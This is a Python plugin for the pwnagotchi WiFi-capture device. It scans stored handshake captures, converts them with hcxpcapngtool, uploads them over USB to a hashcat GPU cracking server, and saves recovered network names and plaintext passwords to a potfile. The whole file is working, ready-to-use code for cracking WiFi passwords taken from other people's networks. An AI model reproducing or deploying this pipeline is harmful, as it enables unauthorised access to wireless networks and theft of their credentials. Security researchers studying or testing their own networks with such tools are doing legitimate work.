import os
import subprocess
import requests
import logging
import json
import time
from threading import Lock, Thread, Event
from pwnagotchi.plugins import Plugin
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import pwnagotchi.ui.fonts as fonts


class GpuCrack(Plugin):
    __author__ = 'charveey'
    __version__ = '2.3.0'
    __license__ = 'GPL3'
    __description__ = (
        'Sends uncracked handshakes to a GPU cracking server on your PC via USB gadget. '
        'Shows hashcat status on the display.'
    )

    POTFILE_PATH  = '/root/handshakes/cracked.pwngpu.potfile'
    STATUS_PATH   = '/root/handshakes/.pwngpu_crack_status.json'
    USB_IFACE     = 'usb0'
    USB_OWN_IP    = '10.0.0.2'   # pwnagotchi's static IP on the USB link
    USB_GATEWAY   = '10.0.0.1'   # PC's IP — where the crack server lives
    POLL_INTERVAL = 60            # seconds between background USB checks

    def __init__(self):
        self.lock         = Lock()
        self.last_run     = 0
        self.sent         = set()
        self.ui_status    = 'GPU: waiting'
        self._status      = 'waiting'
        self._agent       = None
        self._stop_event  = Event()
        self._poll_thread = None
        self._load_status()

    # ------------------------------------------------------------------ #
    #  Status helper                                                       #
    # ------------------------------------------------------------------ #

    def _set_status(self, state: str, detail: str = ''):
        self._status = state
        label_map = {
            'waiting':    'GPU: waiting',
            'no_usb':     'GPU: no USB',
            'connecting': 'GPU: connecting',
            'offline':    'GPU: offline',
            'online':     'GPU: online',
            'scanning':   'GPU: scanning',
            'uploading':  f'GPU: up {detail}',
            'cracking':   f'GPU: crack {detail}',
            'cracked':    f'GPU: {detail} cracked!',
            'no_match':   'GPU: no match',
            'results':    f'GPU: {detail} total',
            'error':      f'GPU: err {detail}',
        }
        self.ui_status = label_map.get(state, f'GPU: {state}')
        logging.debug(f"[pwngpu] status -> {self.ui_status}")

    # ------------------------------------------------------------------ #
    #  Lifecycle                                                           #
    # ------------------------------------------------------------------ #

    def on_loaded(self):
        if not self.options.get('api_key'):
            logging.error("[pwngpu] Missing required config field: api_key")
            return
        self._set_status('waiting')
        self._stop_event.clear()
        self._poll_thread = Thread(target=self._poller, daemon=True, name='pwngpu-poll')
        self._poll_thread.start()
        logging.info("[pwngpu] Plugin loaded, poller started.")

    def on_unload(self, ui):
        self._stop_event.set()
        if self._poll_thread:
            self._poll_thread.join(timeout=5)
        with ui._lock:
            try:
                ui.remove_element('pwngpu_crack_status')
            except KeyError:
                pass
        logging.info("[pwngpu] Plugin unloaded.")

    # ------------------------------------------------------------------ #
    #  Background poller                                                   #
    # ------------------------------------------------------------------ #

    def _poller(self):
        """
        Lightweight daemon thread. Wakes every POLL_INTERVAL seconds.

        While the pwnagotchi is in the field (USB down):
          - One subprocess call to check usb0 → returns immediately → sleeps.
          - No HTTP traffic, no file I/O, negligible battery impact.

        While tethered to the PC (USB up):
          - During cooldown: only checks USB, skips HTTP ping.
            Display stays on last meaningful status (online/results/etc.).
          - When cooldown elapsed: triggers a full _run() sync.
        """
        # Short initial delay so on_epoch/on_internet_available have a
        # chance to store self._agent before the poller first tries to use it.
        self._stop_event.wait(15)

        while not self._stop_event.is_set():
            try:
                self._poll_tick()
            except Exception as e:
                logging.error(f"[pwngpu] poller error: {e}")
            self._stop_event.wait(self.POLL_INTERVAL)

    def _poll_tick(self):
        # Always check USB — cheap subprocess, updates display if down.
        if not self._usb_connected():
            return

        # USB is up. If we have no agent yet, show 'connecting' so the
        # user knows the plugin is alive but not ready yet.
        if self._agent is None:
            self._set_status('connecting')
            return

        sleep = self.options.get('sleep', 1800)
        elapsed = time.time() - self.last_run

        # During cooldown: USB is up but we don't ping the server.
        # The display already shows the result of the last sync —
        # leave it alone to avoid flickering between 'connecting' and
        # the real status on every poll tick.
        if elapsed < sleep:
            return

        # Cooldown elapsed — trigger a full sync if nothing is running.
        if not self.lock.locked():
            self._run(self._agent)
            self.last_run = time.time()

    # ------------------------------------------------------------------ #
    #  UI                                                                  #
    # ------------------------------------------------------------------ #

    def on_ui_setup(self, ui):
        if ui.is_waveshare_v2() or ui.is_waveshare_v3() or ui.is_waveshare_v4():
            pos = (0, 128)
        elif ui.is_waveshare_v1():
            pos = (0, 128)
        elif ui.is_waveshare144lcd():
            pos = (0, 104)
        elif ui.is_inky():
            pos = (0, 96)
        elif ui.is_waveshare27inch():
            pos = (0, 165)
        else:
            pos = (0, 128)

        ui.add_element('pwngpu_crack_status', LabeledValue(
            color=BLACK,
            label='',
            value=self.ui_status,
            position=pos,
            label_font=fonts.Bold,
            text_font=fonts.Small
        ))

    def on_ui_update(self, ui):
        ui.set('pwngpu_crack_status', self.ui_status)

    # ------------------------------------------------------------------ #
    #  Hooks                                                               #
    # ------------------------------------------------------------------ #

    def on_handshake(self, agent, filename, access_point, client_station):
        """New handshake — always upload immediately, bypass cooldown."""
        self._agent = agent
        if not self._usb_connected():
            return
        if self.lock.locked():
            return
        logging.info(f"[pwngpu] New handshake: {filename}")
        self._run(agent)
        self.last_run = time.time()

    def on_internet_available(self, agent):
        self._maybe_run(agent)

    def on_epoch(self, agent, epoch, epoch_data):
        self._maybe_run(agent)

    def _maybe_run(self, agent):
        """Store agent reference; trigger a sync if cooldown has elapsed."""
        self._agent = agent
        if not self._usb_connected():
            return
        if self.lock.locked():
            return
        sleep = self.options.get('sleep', 1800)
        if time.time() - self.last_run < sleep:
            return
        self._run(agent)
        self.last_run = time.time()

    # ------------------------------------------------------------------ #
    #  USB detection                                                       #
    # ------------------------------------------------------------------ #

    def _usb_connected(self):
        """
        Returns True if usb0 is up and has the expected static IP (10.0.0.2).
        Checking for the exact IP guards against a misconfigured interface
        that has some other address and would silently fail to reach the PC.
        Single subprocess call — the only cost while in the field.
        """
        try:
            result = subprocess.run(
                ['ip', 'addr', 'show', self.USB_IFACE],
                capture_output=True, text=True, timeout=3
            )
            if result.returncode != 0 or f'inet {self.USB_OWN_IP}' not in result.stdout:
                self._set_status('no_usb')
                return False
            return True
        except Exception as e:
            logging.debug(f"[pwngpu] USB check error: {e}")
            self._set_status('no_usb')
            return False

    def _get_server_url(self):
        url = self.options.get('server_url', '').rstrip('/')
        if not url:
            port = self.options.get('port', 6881)
            url  = f"http://{self.USB_GATEWAY}:{port}"
        return url

    # ------------------------------------------------------------------ #
    #  Status persistence                                                  #
    # ------------------------------------------------------------------ #

    def _load_status(self):
        if not os.path.exists(self.STATUS_PATH):
            return
        try:
            with open(self.STATUS_PATH, 'r') as f:
                data = json.load(f)
                self.sent = set(data.get('sent', []))
            logging.debug(f"[pwngpu] Loaded {len(self.sent)} previously sent entries.")
        except Exception as e:
            logging.warning(f"[pwngpu] Could not load status: {e}")
            self.sent = set()

    def _save_status(self):
        try:
            with open(self.STATUS_PATH, 'w') as f:
                json.dump({'sent': list(self.sent)}, f)
        except Exception as e:
            logging.warning(f"[pwngpu] Could not save status: {e}")

    # ------------------------------------------------------------------ #
    #  Core sync logic                                                     #
    # ------------------------------------------------------------------ #

    def _run(self, agent):
        with self.lock:
            server_url    = self._get_server_url()
            api_key       = self.options['api_key']
            config        = agent.config()
            handshake_dir = config['bettercap']['handshakes']
            whitelist     = self.options.get('whitelist', [])

            # 1. Ping server
            self._set_status('connecting')
            if not self._ping_server(server_url, api_key):
                logging.warning(f"[pwngpu] Server unreachable at {server_url}")
                self._set_status('offline')
                return

            self._set_status('online')

            # 2. Scan for unsent pcaps
            self._set_status('scanning')
            pcaps = [
                f for f in os.listdir(handshake_dir)
                if f.endswith('.pcap')
                and f not in self.sent
                and not any(w in f for w in whitelist)
            ]

            if not pcaps:
                logging.debug("[pwngpu] No new pcaps to send.")
                self._fetch_and_save_results(server_url, api_key)
                return

            # 3. Convert and upload
            total_new = 0
            logging.info(f"[pwngpu] {len(pcaps)} new pcap(s) to send.")

            for i, pcap_file in enumerate(pcaps, 1):
                pcap_path = os.path.join(handshake_dir, pcap_file)
                hc_path   = pcap_path.replace('.pcap', '.tmp.hc22000')
                short     = pcap_file[:12]

                self._set_status('uploading', f"{i}/{len(pcaps)}")
                hashes = self._convert(pcap_path, hc_path)
                if not hashes:
                    logging.debug(f"[pwngpu] No hashes from {pcap_file}.")
                    self.sent.add(pcap_file)
                    continue

                self._set_status('cracking', short)
                success, cracked_count = self._send(server_url, api_key, hc_path, pcap_file)

                if success:
                    self.sent.add(pcap_file)
                    total_new += cracked_count
                    if cracked_count > 0:
                        logging.info(f"[pwngpu] {cracked_count} password(s) cracked from {pcap_file}")

                if os.path.exists(hc_path):
                    os.remove(hc_path)

            # 4. Final status
            self._save_status()
            if total_new > 0:
                self._set_status('cracked', str(total_new))
            else:
                self._set_status('no_match')

            # 5. Pull accumulated results from server
            self._fetch_and_save_results(server_url, api_key)

    # ------------------------------------------------------------------ #
    #  Network helpers                                                     #
    # ------------------------------------------------------------------ #

    def _ping_server(self, server_url, api_key):
        try:
            r = requests.get(
                f"{server_url}/health",
                headers={'X-API-Key': api_key},
                timeout=5
            )
            return r.status_code == 200
        except Exception:
            return False

    def _send(self, server_url, api_key, hc_path, original_name):
        try:
            with open(hc_path, 'rb') as f:
                response = requests.post(
                    f"{server_url}/crack",
                    headers={'X-API-Key': api_key},
                    files={
                        'file': (
                            original_name.replace('.pcap', '.hc22000'),
                            f,
                            'application/octet-stream'
                        )
                    },
                    timeout=60
                )
            response.raise_for_status()
            data = response.json()
            if data.get('cracked'):
                self._save_results(data['cracked'])
            return True, data.get('total', 0)
        except requests.exceptions.ConnectionError:
            logging.warning("[pwngpu] Connection error during send.")
            self._set_status('offline')
        except requests.exceptions.Timeout:
            logging.warning("[pwngpu] Server timed out during send.")
            self._set_status('error', 'timeout')
        except Exception as e:
            logging.error(f"[pwngpu] Send error: {e}")
            self._set_status('error', 'send')
        return False, 0

    def _convert(self, pcap_path, hc_path):
        try:
            subprocess.run(
                ['hcxpcapngtool', '-o', hc_path, pcap_path],
                capture_output=True, text=True, timeout=60
            )
            if os.path.exists(hc_path) and os.path.getsize(hc_path) > 0:
                with open(hc_path, 'r') as f:
                    return [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            logging.error("[pwngpu] hcxpcapngtool not found.")
            self._set_status('error', 'no hcxtool')
        except Exception as e:
            logging.error(f"[pwngpu] Conversion error: {e}")
            self._set_status('error', 'convert')
        return []

    def _fetch_and_save_results(self, server_url, api_key):
        try:
            r = requests.get(
                f"{server_url}/results",
                headers={'X-API-Key': api_key},
                timeout=10
            )
            r.raise_for_status()
            cracked = r.json().get('cracked', [])
            count   = len(cracked)
            if cracked:
                self._save_results(cracked)
            self._set_status('results', str(count))
            logging.info(f"[pwngpu] {count} total result(s) in server potfile.")
        except Exception as e:
            logging.warning(f"[pwngpu] Could not fetch results: {e}")

    def _save_results(self, cracked):
        if not cracked:
            return
        existing = set()
        if os.path.exists(self.POTFILE_PATH):
            with open(self.POTFILE_PATH, 'r', encoding='utf-8') as f:
                existing = set(line.strip() for line in f if line.strip())
        new_lines = []
        for entry in cracked:
            ssid     = entry.get('ssid', 'unknown')
            bssid    = entry.get('bssid', '00:00:00:00:00:00')
            password = entry.get('password', '')
            if not password:
                continue
            line = f"{bssid}:{bssid}:{ssid}:{password}"
            if line not in existing:
                new_lines.append(line)
                existing.add(line)
        if new_lines:
            with open(self.POTFILE_PATH, 'a', encoding='utf-8') as f:
                for line in new_lines:
                    f.write(line + '\n')
            logging.info(f"[pwngpu] Saved {len(new_lines)} new password(s).")